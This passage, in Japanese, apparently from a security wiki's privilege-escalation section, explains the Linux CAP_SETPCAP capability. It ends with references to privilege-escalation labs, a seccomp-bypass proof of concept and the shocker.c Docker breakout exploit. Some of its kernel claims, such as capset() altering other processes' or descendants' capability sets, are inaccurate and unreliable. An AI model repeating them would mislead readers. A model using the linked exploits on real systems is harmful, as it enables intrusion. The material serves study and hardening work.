`CAP_SETPCAP` を持つ process は、**自身の permitted capability set に含まれる capability だけを付与または削除できます**。つまり、ある process は、自身が保持していない capability を別の process に付与することはできません。この制限により、ある process が別の process の権限を、自身の権限レベルを超えて昇格させることを防止します。

さらに、最近の kernel versions では、`CAP_SETPCAP` capability は **さらに制限**されています。process が他の process の capability sets を任意に変更することはできなくなりました。代わりに、**自身の permitted capability set、または自身の子孫の permitted capability set 内の capability を減少させることだけが可能**です。この変更は、capability に関連する潜在的な security risks を低減するために導入されました。

`CAP_SETPCAP` を効果的に使用するには、effective capability set にこの capability があり、対象となる capability が permitted capability set に含まれている必要があります。その後、`capset()` system call を使用して、他の process の capability sets を変更できます。

要約すると、`CAP_SETPCAP` により、ある process は他の process の capability sets を変更できますが、自身が保持していない capability を付与することはできません。さらに、security concerns により、最近の kernel versions では、その機能は自身の permitted capability set、または子孫の permitted capability sets 内の capability を減少させることだけに制限されています。

## 参考資料

- [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation labs](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege Escalation Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux Container Basics: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Taking Advantage of Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Excessive Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [WithSecure Labs: Abusing the access to mount namespaces through /proc/pid/root](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Why They Exist and How They Work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Understanding Capabilities in Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - original CAP_DAC_READ_SEARCH Docker breakout exploit by Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker breakout exploit analysis](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)

{{#include ../../banners/hacktricks-training.md}}
